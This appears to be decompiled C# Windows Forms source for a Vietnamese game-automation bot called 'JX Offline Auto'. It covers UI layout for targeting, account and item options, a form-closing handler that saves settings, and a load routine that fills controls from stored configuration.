		this.buttonxoauutiennv.Location = new System.Drawing.Point(121, 117);
		this.buttonxoauutiennv.Name = "buttonxoauutiennv";
		this.buttonxoauutiennv.Size = new System.Drawing.Size(27, 23);
		this.buttonxoauutiennv.TabIndex = 149;
		this.buttonxoauutiennv.Text = "X";
		this.buttonxoauutiennv.UseVisualStyleBackColor = true;
		this.buttonxoauutiennv.Click += new System.EventHandler(buttonxoauutiennv_Click);
		this.listViewdanhtennv.Columns.AddRange(new System.Windows.Forms.ColumnHeader[1] { this.columnHeader_6 });
		this.listViewdanhtennv.FullRowSelect = true;
		this.listViewdanhtennv.GridLines = true;
		this.listViewdanhtennv.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.None;
		this.listViewdanhtennv.HideSelection = false;
		this.listViewdanhtennv.Location = new System.Drawing.Point(8, 147);
		this.listViewdanhtennv.MultiSelect = false;
		this.listViewdanhtennv.Name = "listViewdanhtennv";
		this.listViewdanhtennv.Size = new System.Drawing.Size(139, 65);
		this.listViewdanhtennv.TabIndex = 147;
		this.listViewdanhtennv.UseCompatibleStateImageBehavior = false;
		this.listViewdanhtennv.View = System.Windows.Forms.View.Details;
		this.checkBoxkhoamuctieu.AutoSize = true;
		this.checkBoxkhoamuctieu.ForeColor = System.Drawing.SystemColors.Highlight;
		this.checkBoxkhoamuctieu.Location = new System.Drawing.Point(8, 93);
		this.checkBoxkhoamuctieu.Name = "checkBoxkhoamuctieu";
		this.checkBoxkhoamuctieu.Size = new System.Drawing.Size(152, 19);
		this.checkBoxkhoamuctieu.TabIndex = 148;
		this.checkBoxkhoamuctieu.Text = "Khóa Mục tiêu theo tên";
		this.checkBoxkhoamuctieu.UseVisualStyleBackColor = true;
		this.checkBoxkhoamuctieu.CheckedChanged += new System.EventHandler(checkBoxkhoamuctieu_CheckedChanged);
		this.checkBoxChayNhay.AutoSize = true;
		this.checkBoxChayNhay.ForeColor = System.Drawing.Color.Red;
		this.checkBoxChayNhay.Location = new System.Drawing.Point(8, 30);
		this.checkBoxChayNhay.Name = "checkBoxChayNhay";
		this.checkBoxChayNhay.Size = new System.Drawing.Size(149, 19);
		this.checkBoxChayNhay.TabIndex = 150;
		this.checkBoxChayNhay.Text = "Đánh người Chạy nhảy";
		this.checkBoxChayNhay.UseVisualStyleBackColor = true;
		this.checkBoxChayNhay.CheckedChanged += new System.EventHandler(checkBoxChayNhay_CheckedChanged);
		this.comboBoxdanhtennv.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxdanhtennv.Enabled = false;
		this.comboBoxdanhtennv.FormattingEnabled = true;
		this.comboBoxdanhtennv.Location = new System.Drawing.Point(8, 118);
		this.comboBoxdanhtennv.Name = "comboBoxdanhtennv";
		this.comboBoxdanhtennv.Size = new System.Drawing.Size(109, 23);
		this.comboBoxdanhtennv.TabIndex = 146;
		this.comboBoxdanhtennv.SelectedIndexChanged += new System.EventHandler(comboBoxdanhtennv_SelectedIndexChanged);
		this.comboBoxdanhtennv.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxdanhtennv_MouseDown);
		this.checkBoxdanhtennv.AutoSize = true;
		this.checkBoxdanhtennv.Enabled = false;
		this.checkBoxdanhtennv.ForeColor = System.Drawing.Color.Red;
		this.checkBoxdanhtennv.Location = new System.Drawing.Point(8, 72);
		this.checkBoxdanhtennv.Name = "checkBoxdanhtennv";
		this.checkBoxdanhtennv.Size = new System.Drawing.Size(131, 19);
		this.checkBoxdanhtennv.TabIndex = 145;
		this.checkBoxdanhtennv.Text = "Theo Tên Nhân Vật";
		this.checkBoxdanhtennv.UseVisualStyleBackColor = true;
		this.buttonTuyChonMonPhai.BackColor = System.Drawing.SystemColors.Control;
		this.buttonTuyChonMonPhai.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.buttonTuyChonMonPhai.ForeColor = System.Drawing.Color.Black;
		this.buttonTuyChonMonPhai.Location = new System.Drawing.Point(94, 3);
		this.buttonTuyChonMonPhai.Name = "buttonTuyChonMonPhai";
		this.buttonTuyChonMonPhai.Size = new System.Drawing.Size(66, 24);
		this.buttonTuyChonMonPhai.TabIndex = 144;
		this.buttonTuyChonMonPhai.Text = "Môn phái";
		this.buttonTuyChonMonPhai.UseVisualStyleBackColor = false;
		this.buttonTuyChonMonPhai.Click += new System.EventHandler(buttonTuyChonMonPhai_Click);
		this.checkBox2.AutoSize = true;
		this.checkBox2.ForeColor = System.Drawing.Color.Red;
		this.checkBox2.Location = new System.Drawing.Point(8, 8);
		this.checkBox2.Name = "checkBox2";
		this.checkBox2.Size = new System.Drawing.Size(80, 19);
		this.checkBox2.TabIndex = 0;
		this.checkBox2.Text = "Ngũ hành";
		this.checkBox2.UseVisualStyleBackColor = true;
		this.checkBox2.CheckedChanged += new System.EventHandler(checkBox2_CheckedChanged);
		this.buttonXoaIDAcChinh.ForeColor = System.Drawing.Color.Black;
		this.buttonXoaIDAcChinh.Location = new System.Drawing.Point(292, 1);
		this.buttonXoaIDAcChinh.Name = "buttonXoaIDAcChinh";
		this.buttonXoaIDAcChinh.Size = new System.Drawing.Size(22, 25);
		this.buttonXoaIDAcChinh.TabIndex = 145;
		this.buttonXoaIDAcChinh.Text = "X";
		this.buttonXoaIDAcChinh.UseVisualStyleBackColor = true;
		this.buttonXoaIDAcChinh.Click += new System.EventHandler(buttonXoaIDAcChinh_Click);
		this.buttonTimTrongthanh.BackColor = System.Drawing.Color.LawnGreen;
		this.buttonTimTrongthanh.ForeColor = System.Drawing.Color.Black;
		this.buttonTimTrongthanh.Location = new System.Drawing.Point(315, 2);
		this.buttonTimTrongthanh.Name = "buttonTimTrongthanh";
		this.buttonTimTrongthanh.Size = new System.Drawing.Size(82, 24);
		this.buttonTimTrongthanh.TabIndex = 147;
		this.buttonTimTrongthanh.Text = "Thông Tin";
		this.buttonTimTrongthanh.UseVisualStyleBackColor = false;
		this.buttonTimTrongthanh.Click += new System.EventHandler(buttonTimTrongthanh_Click);
		this.richTextBoxChedoMayphu.BackColor = System.Drawing.Color.PaleTurquoise;
		this.richTextBoxChedoMayphu.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBoxChedoMayphu.Cursor = System.Windows.Forms.Cursors.Hand;
		this.richTextBoxChedoMayphu.ForeColor = System.Drawing.Color.DarkRed;
		this.richTextBoxChedoMayphu.HideSelection = false;
		this.richTextBoxChedoMayphu.Location = new System.Drawing.Point(243, 125);
		this.richTextBoxChedoMayphu.MaxLength = 30;
		this.richTextBoxChedoMayphu.Name = "richTextBoxChedoMayphu";
		this.richTextBoxChedoMayphu.ReadOnly = true;
		this.richTextBoxChedoMayphu.RightToLeft = System.Windows.Forms.RightToLeft.No;
		this.richTextBoxChedoMayphu.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.None;
		this.richTextBoxChedoMayphu.Size = new System.Drawing.Size(66, 26);
		this.richTextBoxChedoMayphu.TabIndex = 148;
		this.richTextBoxChedoMayphu.Text = "Là máy phụ\nnút mở rộng";
		this.richTextBoxChedoMayphu.Visible = false;
		this.richTextBoxChedoMayphu.MouseClick += new System.Windows.Forms.MouseEventHandler(richTextBoxChedoMayphu_MouseClick);
		this.pictureBoxQC.Cursor = System.Windows.Forms.Cursors.Hand;
		this.pictureBoxQC.ImageLocation = "";
		this.pictureBoxQC.Location = new System.Drawing.Point(4, 106);
		this.pictureBoxQC.Margin = new System.Windows.Forms.Padding(0);
		this.pictureBoxQC.Name = "pictureBoxQC";
		this.pictureBoxQC.Size = new System.Drawing.Size(146, 88);
		this.pictureBoxQC.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBoxQC.TabIndex = 149;
		this.pictureBoxQC.TabStop = false;
		this.pictureBoxQC.Click += new System.EventHandler(pictureBoxQC_Click);
		this.buttonHelp.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonHelp.ForeColor = System.Drawing.Color.Red;
		this.buttonHelp.Location = new System.Drawing.Point(400, 119);
		this.buttonHelp.Margin = new System.Windows.Forms.Padding(0);
		this.buttonHelp.Name = "buttonHelp";
		this.buttonHelp.Size = new System.Drawing.Size(20, 25);
		this.buttonHelp.TabIndex = 150;
		this.buttonHelp.Text = "H";
		this.buttonHelp.UseVisualStyleBackColor = true;
		this.buttonHelp.Visible = false;
		this.buttonHelp.Click += new System.EventHandler(buttonHelp_Click);
		this.buttonAchinh.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.buttonAchinh.ForeColor = System.Drawing.Color.Red;
		this.buttonAchinh.Location = new System.Drawing.Point(71, 1);
		this.buttonAchinh.Margin = new System.Windows.Forms.Padding(0);
		this.buttonAchinh.Name = "buttonAchinh";
		this.buttonAchinh.Size = new System.Drawing.Size(79, 28);
		this.buttonAchinh.TabIndex = 204;
		this.buttonAchinh.Text = "Ac chính";
		this.buttonAchinh.TextAlign = System.Drawing.ContentAlignment.TopCenter;
		this.buttonAchinh.UseVisualStyleBackColor = true;
		this.buttonAchinh.Click += new System.EventHandler(buttonAchinh_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.AutoSize = true;
		base.ClientSize = new System.Drawing.Size(399, 537);
		base.Controls.Add(this.buttonXoaIDAcChinh);
		base.Controls.Add(this.buttonTimTrongthanh);
		base.Controls.Add(this.buttonAchinh);
		base.Controls.Add(this.buttonHelp);
		base.Controls.Add(this.richTextBoxChedoMayphu);
		base.Controls.Add(this.tabControl1);
		base.Controls.Add(this.textBoxKhoangCachAccChinh);
		base.Controls.Add(this.checkBoxTimTrongthanh);
		base.Controls.Add(this.comboBoxAccChinh);
		base.Controls.Add(this.comboBoxIndex);
		base.Controls.Add(this.checkBoxTimAccchinh);
		base.Controls.Add(this.buttonOff);
		base.Controls.Add(this.buttonAdd);
		base.Controls.Add(this.richTextBoxStatus);
		base.Controls.Add(this.pictureBoxQC);
		base.Controls.Add(this.listView1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.KeyPreview = true;
		base.MaximizeBox = false;
		base.Name = "Form1";
		base.StartPosition = System.Windows.Forms.FormStartPosition.Manual;
		this.Text = "JX Offline Auto";
		base.Load += new System.EventHandler(Form1_Load);
		this.tabControl1.ResumeLayout(false);
		this.tabPage1.ResumeLayout(false);
		this.tabPage1.PerformLayout();
		this.tabControl3.ResumeLayout(false);
		this.tabPageBang1.ResumeLayout(false);
		this.tabPageBang1.PerformLayout();
		this.tabPageBang2.ResumeLayout(false);
		this.tabPageBang2.PerformLayout();
		this.tabPageTongKim.ResumeLayout(false);
		this.tabPageTongKim.PerformLayout();
		this.tabPageCTC.ResumeLayout(false);
		this.tabControlThatThanh.ResumeLayout(false);
		this.tabPageThatthanh.ResumeLayout(false);
		this.tabPageThatthanh.PerformLayout();
		this.tabPageTamtru.ResumeLayout(false);
		this.tabPageTamtru.PerformLayout();
		this.groupBox8.ResumeLayout(false);
		this.groupBox8.PerformLayout();
		this.tabPageTamMondai.ResumeLayout(false);
		this.tabPageTamMondai.PerformLayout();
		this.tabPageTrain.ResumeLayout(false);
		this.tabControl6.ResumeLayout(false);
		this.tabPage16.ResumeLayout(false);
		this.tabPage16.PerformLayout();
		this.tabPage18.ResumeLayout(false);
		this.tabPage18.PerformLayout();
		this.tabPage2.ResumeLayout(false);
		this.tabControlHaucan.ResumeLayout(false);
		this.tabPageMuathuoc.ResumeLayout(false);
		this.tabPageMuathuoc.PerformLayout();
		this.tabControl5.ResumeLayout(false);
		this.tabPage6.ResumeLayout(false);
		this.tabPage6.PerformLayout();
		this.tabPage11.ResumeLayout(false);
		this.tabPage11.PerformLayout();
		this.tabPage5.ResumeLayout(false);
		this.tabPage5.PerformLayout();
		this.tabPagePhuchoi.ResumeLayout(false);
		this.tabPagePhuchoi.PerformLayout();
		this.tabPageChieuthuc.ResumeLayout(false);
		this.tabPageChieuthuc.PerformLayout();
		this.groupBox5.ResumeLayout(false);
		this.groupBox5.PerformLayout();
		this.groupBox1.ResumeLayout(false);
		this.groupBox1.PerformLayout();
		this.tabControlChuyenSkill.ResumeLayout(false);
		this.tabPage19.ResumeLayout(false);
		this.tabPage19.PerformLayout();
		this.tabPage20.ResumeLayout(false);
		this.tabPage20.PerformLayout();
		this.tabPage22.ResumeLayout(false);
		this.tabPage22.PerformLayout();
		this.tabPageBaoVat.ResumeLayout(false);
		this.tabPageBaoVat.PerformLayout();
		this.tabPagetrangbi.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		this.tabControl4.ResumeLayout(false);
		this.tabPage7.ResumeLayout(false);
		this.tabPage7.PerformLayout();
		this.tabControl2.ResumeLayout(false);
		this.tabPage14.ResumeLayout(false);
		this.tabPage14.PerformLayout();
		this.tabPage3.ResumeLayout(false);
		this.tabPage3.PerformLayout();
		this.tabPage9.ResumeLayout(false);
		this.tabControlPhutro.ResumeLayout(false);
		this.tabPage4.ResumeLayout(false);
		this.tabPage4.PerformLayout();
		this.tabPageTinsu.ResumeLayout(false);
		this.groupBox6.ResumeLayout(false);
		this.groupBox6.PerformLayout();
		this.groupBox4.ResumeLayout(false);
		this.groupBox4.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.numericUpDownHH).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDownMM).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDownSS).EndInit();
		this.tabPageTinhLuyen.ResumeLayout(false);
		this.groupBox7.ResumeLayout(false);
		this.groupBox7.PerformLayout();
		this.tabControlLoc.ResumeLayout(false);
		this.tabPageLocTrangbi.ResumeLayout(false);
		this.tabPageLocTrangbi.PerformLayout();
		this.tabPageMuaDung.ResumeLayout(false);
		this.tabPageMuaDung.PerformLayout();
		this.tabPage15.ResumeLayout(false);
		this.tabPage15.PerformLayout();
		this.tabPage12.ResumeLayout(false);
		this.tabPage12.PerformLayout();
		this.tabPage8.ResumeLayout(false);
		this.groupBox3.ResumeLayout(false);
		this.groupBox3.PerformLayout();
		this.groupBox2.ResumeLayout(false);
		this.groupBox2.PerformLayout();
		this.tabPage10.ResumeLayout(false);
		this.tabPage10.PerformLayout();
		this.groupBox10.ResumeLayout(false);
		this.groupBox9.ResumeLayout(false);
		this.groupBox9.PerformLayout();
		this.tabPageTest.ResumeLayout(false);
		this.tabPageTest.PerformLayout();
		this.pkdon.ResumeLayout(false);
		this.pkdon.PerformLayout();
		this.uutien.ResumeLayout(false);
		this.uutien.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.pictureBoxQC).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	protected override void OnFormClosing(FormClosingEventArgs e)
	{
		if (bool_24)
		{
			Class24.smethod_78(mutex_0);
		}
		if (int_136 <= 0)
		{
			if (TryNewVersion.int_0 == 0 && e.CloseReason != CloseReason.WindowsShutDown && !bool_25)
			{
				string text = "Bạn chắc chắn muốn thoát " + string_49 + " ?";
				if (MessageBox.Show(text, string_49, MessageBoxButtons.YesNo) == DialogResult.No)
				{
					e.Cancel = true;
					return;
				}
			}
			Hide();
			Class11.bool_0 = true;
			Thread.Sleep(1200);
			if (characterAccountConfig_1 != null)
			{
				for (int i = 0; i < characterAccountConfig_1.Length; i++)
				{
					Class24.smethod_32(characterAccountConfig_1[i].int_137);
				}
			}
			string text2 = string.Empty;
			if (string_26 != null && string_26.Length != 0)
			{
				for (int j = 0; j < string_26.Length; j++)
				{
					text2 = ((text2 != string.Empty) ? (text2 + "|" + string_26[j]) : string_26[j]);
				}
				text2 = Class11.smethod_16(text2);
			}
			Class11.smethod_34(Class56.string_13, text2, 1);
			Class66.smethod_11(Class66.smethod_1(), "tabControl1", tabControl1.SelectedIndex, "", 0);
			Class66.smethod_11(Class66.smethod_1(), "tabControlLoc", tabControlLoc.SelectedIndex, "", 0);
			Class66.smethod_11(Class66.smethod_1(), "tabControlPhutro", tabControlPhutro.SelectedIndex, "", 0);
			Class66.smethod_11(Class66.smethod_1(), "TC_TimeNext", FormTuyenchien.long_0, "", 0);
			int num = Class24.smethod_56();
			Class66.smethod_13(Class66.smethod_1(), (num * 3).ToString(), 1);
			Thread.Sleep(600);
			if (TryNewVersion.int_0 > 0)
			{
				Thread.Sleep(1500);
				string text3 = Class24.smethod_75();
				Class24.smethod_40(text3, Class11.smethod_14(text3)[0], "", 0);
			}
			Class24.smethod_48(num);
		}
		else
		{
			MessageBox.Show("Còn " + int_136 + " giây nữa mới có thể mở tiếp.", string_49, MessageBoxButtons.OK);
			Class24.smethod_48(Class24.smethod_56());
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			method_0();
			checkBoxkhoamuctieu.Checked = true;
			method_42();
			try
			{
				gform0_0 = new GForm0();
			}
			catch
			{
			}
			try
			{
				if (comboBoxcauhinh != null)
				{
					comboBoxcauhinh.Items.Clear();
					comboBoxcauhinh.Items.Add("480");
					comboBoxcauhinh.Items.Add("512");
					comboBoxcauhinh.Items.Add("NMC");
					comboBoxcauhinh.Items.Add("TVB");
					if (comboBoxcauhinh.Items.Count > 0)
					{
						comboBoxcauhinh.SelectedIndex = 0;
					}
					comboBoxcauhinh.SelectedIndexChanged += comboBoxcauhinh_SelectedIndexChanged;
				}
				comboBoxSelectOverlayItemCount.Items.Add("Không hiện số lượng item");
			}
			catch
			{
			}
		}
		catch
		{
			richTextBoxStatus.Text = "Cash loading... ";
			method_34();
		}
	}

	private void method_0()
	{
		long ticks = DateTime.Now.Ticks;
		string text = Class66.smethod_7("tmsp", 0);
		if (text != null && text != string.Empty)
		{
			int num = 10000;
			long num2 = Class11.smethod_37(text);
			long num3 = (long)new TimeSpan(ticks - num2).TotalMilliseconds;
			if (num2 > 0L && ticks > num2 && num3 < num)
			{
				int_136 = (int)((num + 1000 - num3) / 1000L);
				Close();
				return;
			}
		}
		Class66.smethod_11(Class66.smethod_1(), "tmsp", ticks, "", 0);
		mutex_0 = Class24.smethod_77(ref bool_24, "SmqDataEx");
		Class11.smethod_23(Class56.string_9);
		Class11.smethod_23(Class56.string_10);
		Class56.smethod_24(bool_2: true);
		string text2 = Class24.smethod_75().ToUpper() + ".BAK";
		if (Class11.smethod_1(text2, ".VSHOST.EXE") >= 0)
		{
			text2 = text2.Replace(".VSHOST.EXE", ".EXE");
		}
		Class11.smethod_20(text2);
		if (bool_15)
		{
			base.Text = "TEST " + string_49;
			int_69 = 0;
		}
		notifyIcon_0.Text = string_49;
		checkBoxChayRunAdmin.Checked = Class24.int_40 > 0;
		checkBoxGame.Checked = Class70.int_0 > 0;
		for (int i = 0; i < string_40.Length; i++)
		{
			comboBoxGiamCpu.Items.Add(string_40[i]);
		}
		comboBoxGiamCpu.Text = string_40[0];
		SetBounds(Screen.GetWorkingArea(this).Width - base.Width, Screen.GetWorkingArea(this).Height - base.Height, base.Width, base.Height);
		int_52 = new int[4] { base.Width, base.Height, base.Left, base.Top };
		tabControl1.SelectedIndex = Class66.smethod_4("tabControl1", 0, "0");
		tabControlLoc.SelectedIndex = Class66.smethod_4("tabControlLoc", 0, "0");
		tabControlPhutro.SelectedIndex = Class66.smethod_4("tabControlPhutro", 0, "0");
		new Thread(Class56.smethod_7).Start();
		richTextBoxChedoMayphu.Visible = false;
		if (int_24 < 0 || string_16.Length <= int_24)
		{
			int_24 = 0;
		}
		for (int j = 0; j < string_16.Length; j++)
		{
			comboBoxIndex.Items.Add(string_16[j]);
		}
		comboBoxIndex.Text = string_16[int_24];
		for (int k = 0; k < string_30.Length; k++)
		{
			comboBoxUuTien.Items.Add(string_30[k]);
		}
		comboBoxUuTien.Text = string_30[0];
		checkBoxGiamRamTudong.Checked = int_70 > 0;
		checkBoxDoiTitle.Checked = int_71 > 0;
		for (int l = 0; l < string_31.Length; l++)
		{
			comboBoxXuongNgua.Items.Add(string_31[l]);
		}
		comboBoxXuongNgua.Text = string_31[0];
		for (int m = 0; m < string_34.Length; m++)
		{
			comboBoxBanVatPham.Items.Add(string_34[m]);
		}
		checkBoxTimAccchinh.Checked = int_25 > 0;
		checkBoxTimTrongthanh.Checked = int_26 > 0;
		if (int_27 < 150)
		{
			int_27 = 150;
		}
		textBoxKhoangCachAccChinh.Text = int_27.ToString();
		int num4 = int_128 / 60000;
		timequaylai.Text = num4.ToString();
		string_15 = string_15.Replace(" ", "");
		if (string_15 == string_13 && Class66.smethod_7(string_21, 0) != "0")
		{
			string_15 = Class66.smethod_2(Class56.string_3, string_14, 0, string_15);
			Class66.smethod_11(Class66.smethod_1(), string_21, "0", "", 0);
			Class66.smethod_11(Class66.smethod_1(), string_14, string_15, "", 0);
		}
		textBoxIDSudung.Text = string_15;
		if (FormDoiMauBang.gstruct2_0.string_0 == null || FormDoiMauBang.gstruct2_0.string_0.Length < 6)
		{
			FormDoiMauBang.gstruct2_0.string_0 = "...";
			Class66.smethod_11(Class66.smethod_1(), "TenAccdoiMau", Class11.smethod_16(FormDoiMauBang.gstruct2_0.string_0), "", 0);
		}
		comboBoxAccDoiMau.Items.Add(FormDoiMauBang.gstruct2_0.string_0);
		comboBoxAccDoiMau.Text = FormDoiMauBang.gstruct2_0.string_0;
		if (FormLocdoTest.string_0 == string.Empty || FormLocdoTest.string_0 == null)
		{
			FormLocdoTest.string_0 = "CÈm nang t©n thñ";
		}
		string_23 = new string[1] { FormLocdoTest.string_0 };
		string item = Class1.smethod_1(FormLocdoTest.string_0, 1);
		comboBoxTrangbiTest.Items.Add(item);
		comboBoxTrangbiTest.Text = item;
		textBoxMenuTest.Text = Class11.smethod_69(FormLocdoTest.int_13);
		checkBoxLocTrangbiNPC.Checked = FormLocdoTest.int_4 > 0;
		checkBoxLocTrangbiNhapSL.Checked = FormLocdoTest.int_3 > 0;
		textBoxClickMenuTS.Text = string_45;
		for (int n = 0; n < string_41.Length; n++)
		{
			comboBoxVukhiKieu0.Items.Add(string_41[n]);
			comboBoxVukhiKieu1.Items.Add(string_41[n]);
		}
		checkBoxMuaTDP.Checked = int_59[0] > 0;
		textBoxSoluongTDP.Text = int_59[1].ToString();
		textBoxSoluongThuocDimua.Text = int_60.ToString();
		checkBoxOluonMapphu.Checked = int_44 > 0;
		checkBoxPheThu.Checked = int_29 > 0;
		checkBoxTKThanhTruot.Checked = int_100[0] > 0;
		textBoxTruotTK.Text = int_100[1].ToString();
		checkBoxDanhHieuuy.Checked = int_101 > 0;
		checkBoxTongKimXemSoluong.Checked = int_98 > 0;
		checkBoxCungMucTieu.Checked = int_37 > 0;
		if (string_25 != string.Empty)
		{
			string item2 = Class1.smethod_1(string_25, 1);
			comboBoxMuaVatpham.Items.Add(item2);
			comboBoxMuaVatpham.Text = item2;
		}
		checkBoxMuaKytrancac.Checked = int_77 > 0;
		checkBoxGopVatpham.Checked = int_78 > 0;
		textBoxMuadungSoLuong.Text = int_79[1].ToString();
		checkBoxMuaDungSoluong.Checked = int_79[0] > 0;
		checkBoxThanhTruotSudung.Checked = int_80 > 0;
		checkBoxChatNham.Checked = int_72 > 0;
		textBoxChatNham.Text = string_24;
		checkBoxTuve.Checked = int_34 > 0;
		checkBoxUutienDanhquai.Checked = int_36 > 0;
		checkBoxDanhquai.Checked = int_35 > 0;
		checkBoxDanhquai.Enabled = int_36 == 0;
		checkBoxVaomapAchinh.Checked = int_49 > 0;
		checkBoxAccPhuHauDoanh.Checked = int_95 > 0;
		checkBoxAccChinhHauDoanh.Checked = int_94 > 0;
		checkBoxTrinhSat.Checked = int_96 > 0;
		checkBoxTatMuamauTK.Checked = int_97 > 0;
		checkBoxTuChonClick.Checked = int_99 > 0;
		checkBoxkhoamuctieu.Checked = Class72.int_4 > 0;
		checkBoxChayNhay.Checked = int_39 > 0;
		if (Class72.string_5 != null)
		{
			listViewdanhtennv.Items.Clear();
			for (int num5 = 0; num5 < Class72.string_5.Length; num5++)
			{
				try
				{
					string[] array = new string[1] { Class1.smethod_1(Class72.string_5[num5], 1) };
					ListViewItem value = new ListViewItem(array[0]);
					listViewdanhtennv.Items.Add(value);
				}
				catch
				{
				}
			}
		}
		textBoxMuaMienphiMenu.Text = Class11.smethod_69(int_134);
		comboBoxTenThuocMienphi.Items.Add(Class1.smethod_1(string_35, 1));
		comboBoxTenThuocMienphi.Text = comboBoxTenThuocMienphi.Items[0].ToString();
		checkBoxChuyenChinhxac.Checked = int_102 > 0;
		checkBoxVeThanhCt.Checked = int_103 > 0;
		for (int num6 = 0; num6 < string_32.Length; num6++)
		{
			comboBoxVaodiemBaodanh.Items.Add(string_32[num6]);
		}
		comboBoxVaodiemBaodanh.Text = string_32[int_48[1]];
		checkBoxTubaoDanh.Checked = int_48[0] > 0;
		for (int num7 = 0; num7 < string_36.Length; num7++)
		{
			comboBoxBentau.Items.Add(string_36[num7]);
		}
		if (int_111 < 0 || string_36.Length <= int_111)
		{
			int_111 = 0;
		}
		comboBoxBentau.Text = string_36[int_111];
		for (int num8 = 0; num8 < string_28.Length; num8++)
		{
			comboBoxNhatdo.Items.Add(string_28[num8]);
		}
		for (int num9 = 0; num9 < string_29.Length; num9++)
		{
			comboBoxOtrong.Items.Add(string_29[num9]);
		}
		for (int num10 = 0; num10 < string_33.Length; num10++)
		{
			comboBoxTinSu.Items.Add(string_33[num10]);
		}
		for (int num11 = 0; num11 < string_41.Length; num11++)
		{
			comboBoxKieu1.Items.Add(string_41[num11]);
			comboBoxKieu2.Items.Add(string_41[num11]);
			comboBoxKieu3.Items.Add(string_41[num11]);
		}
		checkBoxDenToadoALL.Checked = int_81 > 0;
		checkBoxDenToadoUser.Enabled = int_81 <= 0;
		checkBoxDenToadoLeave.Checked = int_82 > 0;
		checkBoxKhongNhapso.Checked = int_104 > 0;
		checkBoxMuaThon.Checked = int_105 > 0;
		int_4 = -1;
		int num12 = -1;
		string text3 = Class66.smethod_7("TenWeb", 0, "khác");
		string text4 = Class66.smethod_7("IdexGameOfWebs", 0);
		if (text4 != null && text4 != string.Empty)
		{
			int num13 = Class11.smethod_11(text4);
			if (0 <= num13 && num13 < string_7.GetLength(0))
			{
				text3 = string_7[num13, 0];
				Class66.smethod_11(Class66.smethod_1(), "TenWeb", text3, "", 0);
			}
			Class66.smethod_11(Class66.smethod_1(), "IdexGameOfWebs", string.Empty, "", 0);
		}
		for (int num14 = 0; num14 < string_7.GetLength(0); num14++)
		{
			if (text3 != string.Empty && text3 == string_7[num14, 0])
			{
				int_4 = num14;
				if (string_37 == null || string_37 == string.Empty)
				{
					string_37 = string_7[int_4, 3];
				}
			}
			if (string_7[num14, 0] == "khác")
			{
				num12 = num14;
			}
			comboBoxGameOfWeb.Items.Add(string_7[num14, 0]);
		}
		if (int_4 < 0)
		{
			if (string_8 != null && string_8.GetLength(0) > 0)
			{
				for (int num15 = 0; num15 < string_8.GetLength(0); num15++)
				{
					if (!(text3 == string_8[num15, 0]))
					{
						continue;
					}
					for (int num16 = 0; num16 < string_7.GetLength(0); num16++)
					{
						if (string_8[num15, 2] == string_7[num16, 2])
						{
							int_4 = num16;
							string_37 = string_7[num16, 3];
							Class66.smethod_11(Class66.smethod_1(), "TenWeb", string_7[num16, 0], "", 0);
							break;
						}
					}
					break;
				}
			}
			if (int_4 < 0)
			{
				int_4 = 0;
				string_37 = "3";
				if (num12 > 0)
				{
					int_4 = num12;
				}
			}
		}
		checkBoxGameHu.Checked = int_73 > 0;
		checkBoxBaoKeylog.Checked = int_74 > 0;
		Class6.smethod_3();
		method_5();
		for (int num17 = 0; num17 < Class6.cityTransportData_0.Length; num17++)
		{
			comboBoxChienTruong.Items.Add(Class6.cityTransportData_0[num17].string_2);
			comboBoxChienTruongMapPhu.Items.Add(Class6.cityTransportData_0[num17].string_2);
		}
		comboBoxChienTruong.Text = Class6.cityTransportData_0[int_113].string_2;
		comboBoxChienTruongMapPhu.Text = Class6.cityTransportData_0[int_115].string_2;
		textBox4.Text = string_37;
		checkBoxMapPhu.Checked = int_114 > 0;
		checkBoxAccChinhTudieukhienCTC.Checked = int_119 > 0;
		checkBoxChienLongdong.Checked = int_121 > 0;
		checkBoxVuotAi.Checked = int_122 > 0;
		checkBoxDiemTapket.Checked = int_120 > 0;
		checkBoxChienLongdong.Enabled = int_24 == 0;
		checkBoxTubaoDanh.Enabled = int_24 == 1;
		checkBoxTHPChienLong.Checked = int_116 > 0;
		for (int num18 = 0; num18 < string_38.Length; num18++)
		{
			comboBoxKieudiCLD.Items.Add(string_38[num18]);
		}
		comboBoxKieudiCLD.Text = string_38[int_117];
		for (int num19 = 0; num19 < Class20.string_1.Length; num19++)
		{
			comboBoxCLD.Items.Add(Class20.string_1[num19]);
		}
		comboBoxCLD.Text = Class20.string_1[Class20.int_0];
		for (int num20 = 0; num20 < string_39.Length; num20++)
		{
			comboBoxDoSatcuuSat.Items.Add(string_39[num20]);
		}
		string text5 = Class11.smethod_33(Class56.string_13, 0, 0, 1);
		if (text5 != null && text5 != string.Empty)
		{
			text5 = Class11.smethod_15(text5);
			if (text5 != null && text5 != string.Empty)
			{
				string_26 = text5.Split('|');
			}
		}
		checkBoxTHPCTC.Checked = int_112 > 0;
		for (int num21 = 1; num21 < 12; num21++)
		{
			comboBoxPk.Items.Add(num21);
		}
		string text6 = Class11.smethod_33(Class56.string_15, 0, 0, 1);
		if (text6 != null && text6 != string.Empty)
		{
			text6 = Class11.smethod_15(text6);
			if (text6 != null && text6 != string.Empty)
			{
				AuxiliaryMachineManager.string_0 = text6.Split('|');
			}
		}
		if (string_22 != null && string_22 != string.Empty)
		{
			comboBoxAccChinh.Items.Add(string_22);
			comboBoxAccChinh.Text = string_22;
		}
